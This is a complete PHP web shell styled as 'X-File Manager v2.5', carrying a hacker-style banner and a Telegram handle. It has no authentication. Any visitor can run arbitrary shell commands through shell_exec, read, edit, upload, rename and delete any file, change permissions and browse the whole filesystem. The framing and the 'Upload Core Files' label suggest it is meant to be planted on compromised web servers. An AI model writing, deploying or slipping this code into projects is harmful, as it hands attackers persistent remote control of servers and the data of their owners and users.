<?php
/**
 * X-File Manager v2.5
 * A modern, single-file PHP file manager with path encryption and terminal.
 */

session_start();

// -------------------------------

// Configuration
define('X_FILE_MANAGER_VERSION', '2.5');
define('APP_NAME', 'X-File Manager');
define('ENCRYPTION_KEY', 'RCnFfsCw3ItXaCn7BWvyyFE1Rxdmz'); // Should be changed for security
define('MAX_UPLOAD_SIZE', 100 * 1024 * 1024); // 100MB
define('SESSION_TIMEOUT', 1800); // 30 minutes

// Update last activity
if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > SESSION_TIMEOUT)) {
    session_unset();
    session_destroy();
    session_start();
}
$_SESSION['last_activity'] = time();

// Helper Functions
function encryptPath($path) {
    $iv = openssl_random_pseudo_bytes(16);
    $encrypted = openssl_encrypt($path, 'AES-256-CBC', ENCRYPTION_KEY, 0, $iv);
    return base64_encode($encrypted . '::' . base64_encode($iv));
}

function decryptPath($encoded) {
    try {
        $decoded = base64_decode($encoded);
        if ($decoded === false) return getcwd();
        
        $parts = explode('::', $decoded, 2);
        if (count($parts) !== 2) return getcwd();
        
        $encrypted = $parts[0];
        $iv = base64_decode($parts[1]);
        
        if (strlen($iv) !== 16) return getcwd();
        
        $decrypted = openssl_decrypt($encrypted, 'AES-256-CBC', ENCRYPTION_KEY, 0, $iv);
        return ($decrypted === false) ? getcwd() : $decrypted;
    } catch (Exception $e) {
        return getcwd();
    }
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}

function getPermissions($path) {
    if (!file_exists($path)) return '---------';
    $perms = fileperms($path);
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0100) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0020) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0004) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

function isEditable($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $editable = ['php', 'txt', 'html', 'css', 'js', 'json', 'xml', 'md', 'sql', 'htaccess', 'ini', 'sh', 'py', 'c', 'cpp'];
    return in_array($ext, $editable);
}

// Initial Path Setup
if (!isset($_SESSION['current_path']) || !file_exists($_SESSION['current_path']) || !is_dir($_SESSION['current_path'])) {
    $_SESSION['current_path'] = getcwd();
}

$current_path = $_SESSION['current_path'];
$message = '';
$error = '';

// Handle POST actions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Navigation
    if (isset($_POST['action']) && $_POST['action'] === 'navigate' && isset($_POST['path'])) {
        $new_path = decryptPath($_POST['path']);
        if (file_exists($new_path) && is_dir($new_path)) {
            $_SESSION['current_path'] = $new_path;
            $current_path = $new_path;
        } else {
            $error = "Directory does not exist.";
        }
    }

    // Download
    if (isset($_POST['action']) && $_POST['action'] === 'download' && isset($_POST['path'])) {
        $dl_path = decryptPath($_POST['path']);
        if (file_exists($dl_path) && !is_dir($dl_path)) {
            ob_clean();
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($dl_path) . '"');
            header('Content-Transfer-Encoding: binary');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($dl_path));
            readfile($dl_path);
            exit;
        }
    }

    // Get Content (AJAX)
    if (isset($_POST['action']) && $_POST['action'] === 'getContent' && isset($_POST['path'])) {
        $file_path = decryptPath($_POST['path']);
        if (file_exists($file_path) && !is_dir($file_path)) {
            echo file_get_contents($file_path);
        } else {
            echo "Error: Cannot read file.";
        }
        exit;
    }

    // Execute Command (AJAX)
    if (isset($_POST['action']) && $_POST['action'] === 'executeCommand' && isset($_POST['command'])) {
        $command = $_POST['command'];
        chdir($current_path); // Execute in current directory
        $output = shell_exec($command . ' 2>&1');
        echo $output ? htmlspecialchars($output) : "Command executed with no output.";
        exit;
    }

    // Save File
    if (isset($_POST['saveFile']) && isset($_POST['filePath']) && isset($_POST['fileContent'])) {
        $file_path = decryptPath($_POST['filePath']);
        if (file_put_contents($file_path, $_POST['fileContent']) !== false) {
            $message = "File saved successfully.";
        } else {
            $error = "Failed to save file.";
        }
    }

    // Create File
    if (isset($_POST['createFile']) && isset($_POST['newFileName'])) {
        $new_file = $current_path . DIRECTORY_SEPARATOR . $_POST['newFileName'];
        if (!file_exists($new_file)) {
            if (file_put_contents($new_file, '') !== false) {
                $message = "File created successfully.";
            } else {
                $error = "Failed to create file.";
            }
        } else {
            $error = "File already exists.";
        }
    }

    // Create Folder
    if (isset($_POST['createFolder']) && isset($_POST['newFolderName'])) {
        $new_folder = $current_path . DIRECTORY_SEPARATOR . $_POST['newFolderName'];
        if (!file_exists($new_folder)) {
            if (mkdir($new_folder, 0755)) {
                $message = "Folder created successfully.";
            } else {
                $error = "Failed to create folder.";
            }
        } else {
            $error = "Folder already exists.";
        }
    }

    // Rename
    if (isset($_POST['rename']) && isset($_POST['oldPath']) && isset($_POST['newName'])) {
        $old_path = decryptPath($_POST['oldPath']);
        $new_path = dirname($old_path) . DIRECTORY_SEPARATOR . $_POST['newName'];
        if (rename($old_path, $new_path)) {
            $message = "Renamed successfully.";
        } else {
            $error = "Failed to rename.";
        }
    }

    // Delete
    if (isset($_POST['delete']) && isset($_POST['path'])) {
        $del_path = decryptPath($_POST['path']);
        if (is_dir($del_path)) {
            if (rmdir($del_path)) {
                $message = "Directory deleted successfully.";
            } else {
                $error = "Failed to delete directory. It may not be empty.";
            }
        } else {
            if (unlink($del_path)) {
                $message = "File deleted successfully.";
            } else {
                $error = "Failed to delete file.";
            }
        }
    }

    // Upload
    if (isset($_POST['upload']) && isset($_FILES['file'])) {
        if ($_FILES['file']['error'] === UPLOAD_ERR_OK) {
            $upload_path = $current_path . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
            if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_path)) {
                $message = "File uploaded successfully.";
            } else {
                $error = "Failed to upload file.";
            }
        } else {
            $error = "No file selected or upload error.";
        }
    }

    // Change Permissions
    if (isset($_POST['changePermissions']) && isset($_POST['permPath']) && isset($_POST['permissions'])) {
        $perm_path = decryptPath($_POST['permPath']);
        $octal = octdec($_POST['permissions']);
        if (chmod($perm_path, $octal)) {
            $message = "Permissions changed successfully.";
        } else {
            $error = "Failed to change permissions.";
        }
    }
}

// Breadcrumbs
$breadcrumb_items = [];
$path_parts = explode(DIRECTORY_SEPARATOR, trim($current_path, DIRECTORY_SEPARATOR));

// Add root (if on windows, handle drive letter)
if (strpos($current_path, ':') !== false) {
    $drive = substr($current_path, 0, 3);
    $breadcrumb_items[] = ['name' => $drive, 'path' => encryptPath($drive)];
    $current_build_path = $drive;
} else {
    $breadcrumb_items[] = ['name' => 'Root', 'path' => encryptPath('/')];
    $current_build_path = DIRECTORY_SEPARATOR;
}

foreach ($path_parts as $part) {
    if (empty($part) || (strpos($part, ':') !== false)) continue;
    $current_build_path .= $part . DIRECTORY_SEPARATOR;
    $breadcrumb_items[] = ['name' => $part, 'path' => encryptPath(rtrim($current_build_path, DIRECTORY_SEPARATOR))];
}

// File Listing
$files = [];
if (is_dir($current_path) && $handle = opendir($current_path)) {
    while (false !== ($entry = readdir($handle))) {
        if ($entry === '.' || $entry === '..') continue;
        
        $full_path = $current_path . DIRECTORY_SEPARATOR . $entry;
        $is_dir = is_dir($full_path);
        
        $files[] = [
            'name' => $entry,
            'path' => encryptPath($full_path),
            'isDirectory' => $is_dir,
            'size' => $is_dir ? '-' : formatSize(filesize($full_path)),
            'permissions' => getPermissions($full_path),
            'lastModified' => date("Y-m-d H:i:s", filemtime($full_path)),
            'isEditable' => !$is_dir && isEditable($entry)
        ];
    }
    closedir($handle);
}

// Sort: Folders first, then files
usort($files, function ($a, $b) {
    if ($a['isDirectory'] && !$b['isDirectory']) return -1;
    if (!$a['isDirectory'] && $b['isDirectory']) return 1;
    return strcasecmp($a['name'], $b['name']);
});

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo APP_NAME; ?></title>
    <style>
        /* Base styles and reset */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', 'Roboto', 'Helvetica', sans-serif; }
        body { 
            background-image:url(http://i.imgur.com/9NEcwsL.gif);

        }
        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
        
        /* Navbar */
        .navbar { background-color: #ffffff; box-shadow: 0 2px 8px rgba(0,0,0,0.1); padding: 15px 0; position: sticky; top: 0; z-index: 100; }
        .navbar-content { display: flex; align-items: center; justify-content: space-between; }
        .navbar h1 { color: #333; font-size: 1.5rem; font-weight: 700; }
        .version { font-size: 0.8rem; color: #777; margin-left:10px; }
        .home-btn { 
            background-color: #4a6cf7; color: white; border: none; padding: 8px 15px; border-radius: 6px; 
            cursor: pointer; font-weight: 500; text-decoration: none; display: inline-flex; align-items: center; transition: all 0.2s ease;
        }
        .home-btn:hover { background-color: #3a5ce5; transform: translateY(-2px); box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        .home-icon { margin-right: 5px; }

        /* Top Banner */
        .top-banner { 
            text-align: center; margin: 20px 0 10px 0; padding: 20px; background: rgba(20, 20, 20, 0.9); 
            border-radius: 12px; font-size: 2.2rem; font-weight: 900; 
            text-transform: uppercase; letter-spacing: 4px; box-shadow: 0 0 25px rgba(255, 0, 0, 0.3);
            border: 2px solid #333; backdrop-filter: blur(5px);
        }
        .text-red { color: #ff0000; text-shadow: 0 0 10px rgba(255,0,0,0.5); }
        .text-white { color: #ffffff; }
        .text-green { color: #00ff00; text-shadow: 0 0 10px rgba(0,255,0,0.5); }
        
        .social-line { text-align: center; margin-bottom: 25px; font-weight: bold; font-size: 1.1rem; }
        .social-link { text-decoration: none; }
        .social-link .label { color: #ffffff; }
        .social-link .id { color: #ff0000; }

        /* Breadcrumb */
        .breadcrumb { display: flex; align-items: center; padding: 10px 0; margin-top: 15px; overflow-x: auto; white-space: nowrap; }
        .breadcrumb-item { display: flex; align-items: center; }
        .breadcrumb-item a { color: #4a6cf7; text-decoration: none; padding: 5px 8px; border-radius: 4px; transition: background-color 0.2s; cursor: pointer; }
        .breadcrumb-item a:hover { background-color: rgba(74, 108, 247, 0.1); }
        .breadcrumb-separator { margin: 0 5px; color: #999; }
        .breadcrumb-current { font-weight: 500; padding: 5px 8px; }

        /* Section */
        .section { background-color: rgba(255, 255, 255, 0.92); border-radius: 10px; padding: 25px; margin-bottom: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); border: 1px solid #eee; }
        .section-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .section-title { font-size: 1.25rem; color: #222; font-weight: 700; border-left: 4px solid #4a6cf7; padding-left: 12px; }
        
        /* Form */
        .upload-form { display: flex; flex-wrap: wrap; gap: 15px; align-items: center; }
        .upload-form input[type="file"] { flex: 1; min-width: 250px; padding: 12px; border: 1px solid #ddd; border-radius: 8px; background-color: #fcfcfc; transition: border 0.3s; }
        .upload-form input[type="file"]:focus { border-color: #4a6cf7; outline: none; }
        .btn { background-color: #4a6cf7; color: white; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; font-weight: 600; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
        .btn:hover { background-color: #3a5ce5; transform: translateY(-3px); box-shadow: 0 6px 15px rgba(74, 108, 247, 0.3); }
        .btn:active { transform: translateY(-1px); }
        .btn-sm { padding: 8px 16px; font-size: 0.95rem; }
        .btn-success { background-color: #2da44e; }
        .btn-success:hover { background-color: #2c974b; box-shadow: 0 6px 15px rgba(45, 164, 78, 0.3); }

        /* Table */
        .file-table-container { overflow-x: auto; border-radius: 8px; border: 1px solid #eee; }
        .file-table { width: 100%; border-collapse: collapse; background: #fff; }
        .file-table th { background-color: #f8f9fa; padding: 15px; text-align: left; font-weight: 600; color: #444; border-bottom: 2px solid #eee; }
        .file-table td { padding: 15px; border-bottom: 1px solid #f1f1f1; color: #555; font-size: 0.95rem; }
        .file-table tr:hover { background-color: #f8faff; }
        .file-name { display: flex; align-items: center; gap: 12px; }
        .folder-icon { font-size: 1.2rem; }
        .file-icon { font-size: 1.2rem; }
        .folder-icon::before { content: "📁"; }
        .file-icon::before { content: "📄"; }

        /* Actions */
        .action-buttons { display: flex; gap: 10px; }
        .action-btn { background: #f4f6f9; border: none; cursor: pointer; font-size: 1.1rem; color: #666; width: 34px; height: 34px; display: flex; align-items: center; justify-content: center; border-radius: 8px; transition: all 0.2s; }
        .action-btn:hover { background-color: #4a6cf7; color: #fff; transform: scale(1.1); }

        /* Terminal Console */
        .terminal-container { 
            background: #0d1117; border-radius: 12px; margin-top: 30px; 
            padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #30363d;
            position: relative; overflow: hidden;
        }
        .terminal-container::before {
            content: ""; position: absolute; top: 0; left: 0; right: 0; height: 3px;
            background: linear-gradient(90deg, #4a6cf7, #a855f7);
        }
        .terminal-header { color: #8b949e; font-size: 0.95rem; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; font-family: 'Courier New', monospace; }
        .terminal-output { 
            background: #010409; color: #3fb950; padding: 15px; height: 250px; overflow-y: auto; 
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace; border-radius: 6px; 
            margin-bottom: 15px; white-space: pre-wrap; border: 1px solid #30363d;
            box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);
        }
        .terminal-input-group { display: flex; gap: 12px; }
        .terminal-input { 
            flex: 1; background: #010409; color: #e6edf3; border: 1px solid #30363d; padding: 12px 16px; 
            border-radius: 8px; font-family: 'Consolas', 'Monaco', 'Courier New', monospace; font-size: 1rem;
            transition: border-color 0.3s, box-shadow 0.3s;
        }
        .terminal-input:focus { border-color: #4a6cf7; outline: none; box-shadow: 0 0 0 3px rgba(74, 108, 247, 0.2); }

        /* Modal */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.7); z-index: 1000; justify-content: center; align-items: center; backdrop-filter: blur(4px); }
        .modal-content { background-color: white; padding: 30px; border-radius: 12px; width: 90%; max-width: 550px; box-shadow: 0 20px 50px rgba(0,0,0,0.3); animation: modalFadeIn 0.3s ease-out; }
        @keyframes modalFadeIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
        .modal-content.modal-lg { max-width: 900px; height: 85%; display: flex; flex-direction: column; }
        .modal-title { font-size: 1.5rem; margin-bottom: 20px; font-weight: 700; color: #333; }
        .modal-form { display: flex; flex-direction: column; gap: 20px; }
        .editor-form { display: flex; flex-direction: column; gap: 20px; flex-grow: 1; }
        .form-group { display: flex; flex-direction: column; gap: 8px; }
        .form-group label { font-weight: 600; color: #444; }
        .form-group input, .form-group textarea { padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 1rem; transition: border-color 0.3s; }
        .form-group input:focus, .form-group textarea:focus { border-color: #4a6cf7; outline: none; }
        .form-group textarea { flex-grow: 1; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; resize: none; line-height: 1.5; }
        .modal-actions { display: flex; justify-content: flex-end; gap: 12px; margin-top: 25px; }
        .btn-cancel { background-color: #f1f3f5; color: #495057; }
        .btn-cancel:hover { background-color: #e9ecef; box-shadow: none; transform: none; }

        /* Alerts */
        .alert { padding: 15px 20px; margin-bottom: 20px; border-radius: 10px; font-weight: 600; animation: slideDown 0.4s cubic-bezier(0.18, 0.89, 0.32, 1.28); }
        @keyframes slideDown { from { transform: translateY(-20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        .alert-success { background-color: #ecfdf5; color: #065f46; border: 1px solid #a7f3d0; }
        .alert-error { background-color: #fef2f2; color: #991b1b; border: 1px solid #fecaca; }
        .alert-warning { background-color: #fffbeb; color: #92400e; border: 1px solid #fde68a; }

        /* Spinner */
        .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255,255,255,0.7); z-index: 2000; justify-content: center; align-items: center; }
        .spinner { width: 60px; height: 60px; border: 6px solid #f3f3f3; border-top: 6px solid #4a6cf7; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        @media (max-width: 768px) {
            .upload-form { flex-direction: column; align-items: stretch; }
            .section-header { flex-direction: column; align-items: flex-start; gap: 15px; }
            .btn { width: 100%; }
            .top-banner { font-size: 1.4rem; letter-spacing: 2px; }
        }
    </style>
</head>
<body>
    <div id="loadingOverlay" class="loading-overlay"><div class="spinner"></div></div>

    <nav class="navbar">
        <div class="container navbar-content">
            <h1><?php echo APP_NAME; ?> <span class="version">v<?php echo X_FILE_MANAGER_VERSION; ?></span></h1>
            <div class="navbar-actions">
                <button onclick="navigateTo('<?php echo encryptPath(getcwd()); ?>')" class="home-btn">
                    <span class="home-icon">🏠</span> Home
                </button>
            </div>
        </div>
    </nav>

    <div class="container">
        <!-- Top Banner -->
        <div class="top-banner">
            <span class="text-red">X</span><span class="text-white">-</span><span class="text-green">FILE MANAGER V<?php echo X_FILE_MANAGER_VERSION; ?></span>
        </div>
        
        <!-- Social Line -->
        <div class="social-line">
            <a href="https://t.me/jackleet" target="_blank" class="social-link">
                <span class="label">telegram:</span> <span class="id">@jackleet</span>
            </a>
        </div>

        <!-- Breadcrumbs -->
        <div class="breadcrumb">
            <?php foreach ($breadcrumb_items as $index => $item): ?>
                <div class="breadcrumb-item">
                    <?php if ($index === count($breadcrumb_items) - 1): ?>
                        <span class="breadcrumb-current"><?php echo htmlspecialchars($item['name']); ?></span>
                    <?php else: ?>
                        <a onclick="navigateTo('<?php echo $item['path']; ?>')"><?php echo htmlspecialchars($item['name']); ?></a>
                        <span class="breadcrumb-separator">›</span>
                    <?php endif; ?>
                </div>
            <?php endforeach; ?>
        </div>

        <!-- Alerts -->
        <?php if ($message): ?><div class="alert alert-success"><?php echo $message; ?></div><?php endif; ?>
        <?php if ($error): ?><div class="alert alert-error"><?php echo $error; ?></div><?php endif; ?>

        <!-- Upload Section -->
        <section class="section">
            <h2 class="section-title">Upload Core Files</h2>
            <form class="upload-form" method="post" enctype="multipart/form-data">
                <input type="file" name="file" required>
                <button type="submit" name="upload" class="btn">Upload to Server</button>
            </form>
        </section>

        <!-- Files List Section -->
        <section class="section">
            <div class="section-header">
                <h2 class="section-title">File Explorer</h2>
                <div class="section-actions">
                    <button class="btn btn-sm btn-success" onclick="showCreateFileModal()">+ New File</button>
                    <button class="btn btn-sm" onclick="showCreateFolderModal()">+ New Folder</button>
                </div>
            </div>
            <div class="file-table-container">
                <table class="file-table">
                    <thead>
                        <tr>
                            <th>Filename</th>
                            <th>Size</th>
                            <th>Permissions</th>
                            <th>Modified</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if ($current_path !== DIRECTORY_SEPARATOR && $current_path !== substr(getcwd(), 0, 3)): ?>
                        <tr>
                            <td><div class="file-name"><span class="folder-icon"></span><a onclick="navigateTo('<?php echo encryptPath(dirname($current_path)); ?>')">.. (Parent Directory)</a></div></td>
                            <td>-</td><td>-</td><td>-</td><td>-</td>
                        </tr>
                        <?php endif; ?>
                        <?php foreach ($files as $file): ?>
                        <tr>
                            <td>
                                <div class="file-name">
                                    <span class="<?php echo $file['isDirectory'] ? 'folder-icon' : 'file-icon'; ?>"></span>
                                    <?php if ($file['isDirectory']): ?>
                                        <a onclick="navigateTo('<?php echo $file['path']; ?>')"><?php echo htmlspecialchars($file['name']); ?></a>
                                    <?php else: ?>
                                        <span><?php echo htmlspecialchars($file['name']); ?></span>
                                    <?php endif; ?>
                                </div>
                            </td>
                            <td><?php echo $file['size']; ?></td>
                            <td><?php echo $file['permissions']; ?></td>
                            <td><?php echo $file['lastModified']; ?></td>
                            <td>
                                <div class="action-buttons">
                                    <?php if (!$file['isDirectory']): ?>
                                        <button class="action-btn" title="Download" onclick="downloadFile('<?php echo $file['path']; ?>')">📥</button>
                                        <?php if ($file['isEditable']): ?>
                                            <button class="action-btn" title="Edit" onclick="showEditFileModal('<?php echo $file['path']; ?>', '<?php echo addslashes($file['name']); ?>')">📝</button>
                                        <?php endif; ?>
                                    <?php endif; ?>
                                    <button class="action-btn" title="Rename" onclick="showRenameModal('<?php echo $file['path']; ?>', '<?php echo addslashes($file['name']); ?>')">✏️</button>
                                    <button class="action-btn" title="Permissions" onclick="showPermissionsModal('<?php echo $file['path']; ?>', '<?php echo addslashes($file['name']); ?>')">🔐</button>
                                    <form method="post" style="display:inline;" onsubmit="return confirm('Permanently delete this <?php echo $file['isDirectory'] ? 'folder' : 'file'; ?>?');">
                                        <input type="hidden" name="path" value="<?php echo $file['path']; ?>">
                                        <button type="submit" name="delete" class="action-btn" title="Delete">🗑️</button>
                                    </form>
                                </div>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </section>

        <!-- Command Console (Terminal) -->
        <section class="terminal-container">
            <div class="terminal-header">
                <span>>_ X-TERMINAL V2.5</span>
                <span>Context: <?php echo htmlspecialchars($current_path); ?></span>
            </div>
            <div id="terminalOutput" class="terminal-output">mr X-File Manager Terminal Ready.
All commands will be executed relative to the current directory.
Type 'help' for hints or any system command to begin.</div>
            <div class="terminal-input-group">
                <input type="text" id="terminalInput" class="terminal-input" placeholder="Enter shell command here..." autocomplete="off">
                <button onclick="executeCommand()" class="btn btn-sm btn-success">Run Cmd</button>
            </div>
        </section>
        
        <div style="height: 50px;"></div>
    </div>

    <!-- Modals -->
    <div id="renameModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">Rename: <span id="renameFileName"></span></h3>
            <form class="modal-form" method="post">
                <input type="hidden" id="renameOldPath" name="oldPath">
                <div class="form-group">
                    <label>New Item Name</label>
                    <input type="text" id="renameNewName" name="newName" required>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('renameModal')">Cancel</button>
                    <button type="submit" name="rename" class="btn">Rename Item</button>
                </div>
            </form>
        </div>
    </div>

    <div id="permissionsModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">Modify Permissions: <span id="permissionsFileName"></span></h3>
            <form class="modal-form" method="post">
                <input type="hidden" id="permissionsPath" name="permPath">
                <div class="form-group">
                    <label>Octal Representation (e.g., 0755 or 0644)</label>
                    <input type="text" name="permissions" placeholder="0755" required>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('permissionsModal')">Cancel</button>
                    <button type="submit" name="changePermissions" class="btn">Apply Changes</button>
                </div>
            </form>
        </div>
    </div>

    <div id="createFileModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">Create New File</h3>
            <form class="modal-form" method="post">
                <div class="form-group">
                    <label>Filename (with extension)</label>
                    <input type="text" name="newFileName" placeholder="script.php" required>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('createFileModal')">Cancel</button>
                    <button type="submit" name="createFile" class="btn">Create File</button>
                </div>
            </form>
        </div>
    </div>

    <div id="createFolderModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">Create New Folder</h3>
            <form class="modal-form" method="post">
                <div class="form-group">
                    <label>Folder Name</label>
                    <input type="text" name="newFolderName" placeholder="assets" required>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('createFolderModal')">Cancel</button>
                    <button type="submit" name="createFolder" class="btn">Create Folder</button>
                </div>
            </form>
        </div>
    </div>

    <div id="editFileModal" class="modal">
        <div class="modal-content modal-lg">
            <h3 class="modal-title">Editor: <span id="editFileName"></span></h3>
            <form class="editor-form" method="post">
                <input type="hidden" id="editFilePath" name="filePath">
                <div class="form-group" style="flex-grow:1; display:flex; flex-direction:column;">
                    <textarea id="fileContent" name="fileContent" required></textarea>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('editFileModal')">Cancel</button>
                    <button type="submit" name="saveFile" class="btn">Save Changes</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Hidden forms for JS -->
    <form id="navigationForm" method="post" style="display:none;"><input type="hidden" name="action" value="navigate"><input type="hidden" id="navigationPath" name="path"></form>
    <form id="downloadForm" method="post" style="display:none;"><input type="hidden" name="action" value="download"><input type="hidden" id="downloadPath" name="path"></form>

    <script>
        function showLoading() { document.getElementById('loadingOverlay').style.display = 'flex'; }
        function hideLoading() { document.getElementById('loadingOverlay').style.display = 'none'; }
        
        // Navigation helper that preserves the key in the URL
        function navigateTo(path) { 
            showLoading(); 
            document.getElementById('navigationPath').value = path;
            const form = document.getElementById('navigationForm');
            form.submit(); 
        }

        function downloadFile(path) { 
            const form = document.getElementById('downloadForm');
            document.getElementById('downloadPath').value = path; 
            form.submit(); 
        }

        function hideModal(id) { document.getElementById(id).style.display = 'none'; }
        
        function showRenameModal(path, name) {
            document.getElementById('renameFileName').textContent = name;
            document.getElementById('renameOldPath').value = path;
            document.getElementById('renameNewName').value = name;
            document.getElementById('renameModal').style.display = 'flex';
        }

        function showPermissionsModal(path, name) {
            document.getElementById('permissionsFileName').textContent = name;
            document.getElementById('permissionsPath').value = path;
            document.getElementById('permissionsModal').style.display = 'flex';
        }

        function showCreateFileModal() { document.getElementById('createFileModal').style.display = 'flex'; }
        function showCreateFolderModal() { document.getElementById('createFolderModal').style.display = 'flex'; }

        function showEditFileModal(path, name) {
            document.getElementById('editFileName').textContent = name;
            document.getElementById('editFilePath').value = path;
            showLoading();
            const formData = new FormData();
            formData.append('action', 'getContent');
            formData.append('path', path);
            fetch(window.location.href, { method: 'POST', body: formData })
            .then(r => r.text())
            .then(content => {
                document.getElementById('fileContent').value = content;
                document.getElementById('editFileModal').style.display = 'flex';
                hideLoading();
            }).catch(e => { hideLoading(); alert('Error loading file: ' + e); });
        }

        // Terminal Functionality
        function executeCommand() {
            const cmd = document.getElementById('terminalInput').value;
            if (!cmd) return;
            
            const outputBox = document.getElementById('terminalOutput');
            const timestamp = new Date().toLocaleTimeString();
            outputBox.textContent += `\n[${timestamp}] $ ${cmd}\n`;
            outputBox.scrollTop = outputBox.scrollHeight;
            
            const formData = new FormData();
            formData.append('action', 'executeCommand');
            formData.append('command', cmd);
            
            document.getElementById('terminalInput').value = '';
            
            fetch(window.location.href, { method: 'POST', body: formData })
            .then(r => r.text())
            .then(res => {
                outputBox.textContent += res + '\n';
                outputBox.scrollTop = outputBox.scrollHeight;
            })
            .catch(e => {
                outputBox.textContent += 'Execution Error: ' + e + '\n';
                outputBox.scrollTop = outputBox.scrollHeight;
            });
        }

        // Handle Enter key in terminal
        document.getElementById('terminalInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') executeCommand();
        });

        // Global form submission loader
        document.querySelectorAll('form').forEach(f => {
            f.addEventListener('submit', () => {
                if (f.id !== 'navigationForm' && f.id !== 'downloadForm') showLoading();
            });
        });
        
        // Modal click-outside to close
        window.onclick = function(event) {
            if (event.target.className === 'modal') {
                event.target.style.display = 'none';
            }
        }
    </script>
</body>
</html>
